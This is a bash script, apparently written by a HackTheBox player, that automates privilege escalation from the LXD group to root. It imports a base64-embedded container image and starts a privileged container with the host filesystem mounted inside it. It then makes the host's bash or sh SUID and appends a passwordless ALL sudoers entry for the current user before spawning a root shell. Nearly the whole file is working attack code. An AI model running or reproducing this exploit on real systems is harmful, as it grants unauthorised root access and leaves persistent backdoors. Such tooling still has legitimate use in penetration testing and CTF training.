#!/usr/bin/env bash

#########################################################################
#### Author: David Alonso (David132435)            		     ####
#########################################################################
#### HTB profile: https://app.hackthebox.com/users/852668  	     ####
#### GitHub: https://github.com/David132435                    	     ####
#### LinkedIn: https://www.linkedin.com/in/david-alonso-21015724b/   ####
#########################################################################

################### Variables ######################

image=PWN
container=PWNED
device=pwnedevice
user=$(whoami)
sudoersPayload="$user ALL=\(ALL\) NOPASSWD:ALL"
image_base64="QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng="
imageFileName=image.tar.bz2
wherebash=$(which bash)
wheresh=$(which sh)


##################### Colors #########################

red="\e[0;91m"
blue="\e[0;94m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
end="\e[0m"

####################### Functions #########################

function banner(){
echo -e "\n${green}${bold}|---------------------------- LXD GROUP PRIVILEGE ESCALATION ----------------------------|"
echo -e "|                         Made  by:${end}  ${white}${bold} David  Alonso  (David132435)  ${end}${green}${bold}                     |"
echo -e "|----------------------------------------------------------------------------------------|${end}"
}


function help(){
banner
sleep 0.05
echo -e "\n\t\t\t\t${yellow}${bold}Usage: ${end}${white}${bold}./lxdprivesc.sh --run${end}"
echo -e ""
sleep 0.05
echo -e "${green}${bold}----------------------------------------- OPTIONS ----------------------------------------${end}"
echo -e ""
echo -e " ${blue}${bold}\t    --run,                          ${purple}-->${end}    ${white}${bold}Run the script${end}"
echo -e " ${blue}${bold}\t    --clean,   -c${end}                   ${purple}-->${end}    ${white}${bold}Clean the containers${end}"
echo -e ""
echo -e "\n${green}${bold}|---------------------------------( ${uline}HOW DOES IT WORK?${end}${green}${bold} )----------------------------------|"
echo -e ""
echo -e "${yellow}1. ${end}${blue}${bold}If you are in the ${end}${gray}lxd group${end}${blue}${bold}, it means that you can create a container and so you can"
echo -e "mount the system inside the container. When you create a container you have ${end}${red}${bold}root${end}${blue}${bold}"
echo -e "privileges on it, so technically you have root priviliges over the real system too."
echo -e ""
echo -e "${end}${yellow}2. ${end}${blue}${bold}This script will automate the process of the container creation and privilege"
echo -e "escalation by converting bash or any other shell in the system into ${end}${red}${bold}SUID${end}${blue}${bold} and then adding"
echo -e "the user that you are using right now (this is done by using the ${end}${gray}whoami${end}${blue}${bold} command) to the"
echo -e "${end}${gray}/etc/sudoers${end}${blue}${bold} file and allowing you to run any command with sudo without giving the password."
echo -e ""
echo -e "${end}${yellow}3. ${end}${blue}${bold}The script will check that you have the right permissions to elevate your privilege"
echo -e "Usually, you need an image to create the container, however, this script has an image"
echo -e "encoded in base64 that is decoded and built during execution, so you don't have to worry" 
echo -e "about it."

}


function getshell(){
echo -e "\n${yellow}[*]${end}${purple} Trying to get a shell inside the container...${end}\n"
sleep 4
lxc exec $container bash || lxc exec $container sh
}

function imagecreator(){

echo -e "\n${green}${bold}------------------------------------- CREATING IMAGE -------------------------------------"
sleep 2
echo -e ""
echo -e "${yellow}[-]${end}${turquoise} Creating Image with name${end}${gray} $imageFileName...${end}"
echo $image_base64 | base64 -d > $imageFileName
sleep 4

if [ -f "$imageFileName" ]; then
	echo -e "${yellow}[+] ${end}${turquoise}Image file created succesfully!${end}"
else
	echo -e "${red}${bold}[!] Could not create file $imageFileName. You can see the error here:${end}"
	echo -e ""
	(echo $image_base64 | base64 -d > $imageFileName)
	echo -e ""
	exit 1
fi

}


function makesuid(){

shell=$1
echo -e "${yellow}[+]${end}${purple} Making${end}${gray} $shell${end}${red}${bold} SUID${end}${purple} file`sleep 1`.`sleep 1`.${end}"
sleep 2

lxc exec $container chmod 4755 /r$shell


if [ $? -eq 0 ]; then
        echo -e "${yellow}[+]${end}${gray} $shell${end}${purple} is now ${end}${red}${bold}SUID!${end}"
        sleep 4
	echo -e "${yellow}[*]${end}${purple} Adding${end}${gray} $user${end}${purple} to ${end}${gray}/etc/sudoers${end}${purple} file...${end}"
	sleep 4
	$shell -p -c "echo $sudoersPayload >> /etc/sudoers"

	if [ $? -eq 0 ]; then
		echo -e "${yellow}[+]${end}${purple} User${end}${gray} $user${end}${purple} can now execute any command with sudo without password!"
		sleep 3

		echo -e "${yellow}[*]${end} ${purple}Trying to prompt a shell as ${end}${red}${gray}root${end}${purple}...${end}"
		echo -e ""
		sleep 5

		sudo $shell || $shell -p

	else
		echo "${red}${bold}[!] ERROR. It was not possible to add you to /etc/sudoers. Check the error here:\n${end}"
		$shell -p -c "echo $sudoersPayload >> /etc/sudoers"

	fi
fi

}



function exploit(){

echo -e "\n${green}${bold}--------------------------------- CHECKING PERMISSIONS  ----------------------------------\n"

# lxc command check
echo -e "${yellow}[-]${end}${turquoise} Checking that you can run ${end}${gray}lxc${end}${turquoise} command...${end}"
sleep 4
lxc list &>/dev/null

if [ $? -eq 0 ]; then
	echo -e "${yellow}[+]${end} ${turquoise}You can run${end} ${gray}lxc${end}${turquoise} commmand!${end}\n"
	sleep 3
else
	echo -e "\n${red}${bold}[!] There was an error while trying to run${end}${gray} lxc${end}${red}${bold} command. You can see the problem here:$end"
	lxc list
	exit 1

fi

# lxd command check

echo -e "${yellow}[-]${end}${turquoise} Checking that you can run ${end}${gray}lxd${end}${turquoise} command...${end}"
sleep 4
lxd init --auto &>/dev/null

if [ $? -eq 0 ]; then
        echo -e "${yellow}[+]${end} ${turquoise}You can run${end} ${gray}lxd${end}${turquoise} commmand!${end}"
else
        echo -e "${red}${bold}[!] There was an error while trying to run${end}${gray} lxd${end}${red}${bold} command. You can see the problem here:$end"
        lxd init --auto
	echo -e "${yellow}[-] Exploit will continue but it might fail${end}"
fi

echo -e "\n${green}${bold}----------------------------------- CREATING CONTAINER -----------------------------------\n"
sleep 3

echo -e "${yellow}[+]${end} ${purple}Starting Privilege Escalation :)${end}"
lxc image import $imageFileName --alias $image 1> /dev/null
sleep 1

echo -e "${yellow}[+]${end} ${turquoise}Image${end} ${gray}$imageFileName${end} ${turquoise}imported succesfully!${end}"
lxd init --auto 1>/dev/null

echo -e "${yellow}[-]${end} ${turquoise}Running image with name${end}${purple} ->${end}${gray} $image...${end}"
lxc init $image $container -c security.privileged=true 1>/dev/null
sleep 5

echo -e "${yellow}[-]${end} ${turquoise}Container created!${end}"
sleep 2

echo -e "${yellow}[-]${end}${turquoise} Mounting system inside the container at ${end}${gray}/r...${end}"
lxc config device add $container $device disk source=/ path=r recursive=true 1>/dev/null
sleep 2

echo -e "${yellow}[-]${end} ${turquoise}Starting the container with name${end}${purple} ->${end} ${gray}$container...${end}"
lxc start $container 1>/dev/null
sleep 5

echo -e "\n${green}${bold}--------------------------------- CHANGING PERMISSIONS  ----------------------------------\n"
sleep 2

echo -e "${yellow}[-]${end}${purple} Looking for a shell to make it${end}${red}${bold} SUID${end}${purple}...${end}"
sleep 4


if [ -n "$wherebash" ]; then
	echo -e "${yellow}[+]${end}${purple}Shell${end}${gray} $wherebash${end}${purple} found!"
	sleep 2
	makesuid $wherebash


else
	echo -e "${red}${bold}[!] Shell bash not found in path.${end}"
	sleep 1.5

	if [ -f "/bin/bash" ];then
		bashpath="/bin/bash"
		echo -e "${yellow}[+]${end}${purple}Shell${end}${gray} $bashpath${end}${purple} found!"
		sleep 2
		makesuid $bashpath

	else
		echo -e "${red}${bold}[!] Shell bash not found at ${end}${gray}/bin/bash${end}"
		sleep 1.5

		if [ -n "$wheresh" ];then
			echo -e "${yellow}[+]${end}${purple}Shell${end}${gray} $wheresh${end}${purple} found!"
			sleep 2
			makesuid $wheresh

		else

			echo -e "${red}${bold}[!] Shell sh not found in path.${end}"
			sleep 1.5

			if [ -f "/bin/sh" ];then
				shpath="/bin/sh"
				echo -e "${yellow}[+]${end}${purple}Shell${end}${gray} $shpath${end}${purple} found!"
				sleep 2
				makesuid $shpath

			else

				echo -e "${red}${bold}[!] Shell sh not found at${end}${gray} /bin/sh${end}"
				echo -e ""
				echo -e "${yellow}[!]${end}${purple} Sorry, no valid shell was found in the system. If you know a valid path for a shell, feel free to modify the script and change any of the shell variables value (Ex: 'wherebash' or 'wheresh') to the path that you want to.\n${end}"

				getshell

				exit

			fi

		fi

	fi

fi

}

function clean(){
echo -e "\n${green}${bold}----------------------------------- CLEANING CONTAINER -----------------------------------\n"
echo -e "${yellow}[*]${end} ${turquoise}Cleaning container and image...${end}"
sleep 2

echo -e "${yellow}[*]${end} ${turquoise}Stopping container with name ${end}${gray}$container...${end}"
sleep 1.5
lxc stop $container

echo -e "${yellow}[*]${end} ${turquoise}Deleting container with name${end} ${gray}$container...${end}"
sleep 1.5
lxc delete $container

echo -e "${yellow}[*]${end} ${turquoise}Deleting imagewith name${end} ${gray}$image...${end}"
sleep 2
lxc image delete $image

echo -e "${yellow}[+]${end} ${purple}Done${end}\n"
}


################### PROGRAM ####################

if [ $# -eq 0 ]; then
	help

else

	for arg in "$@"; do
		case $arg in

		-c)
		banner
		clean
		;;

		--clean)
		banner
		clean
		;;

		--run)
		banner
		imagecreator
		exploit
		;;

		*)
		echo -e "${red}${bold}\n[!] Unknown option. Check help:\n${end}"
		help
		;;

		esac
	done
fi

# Hello! :)
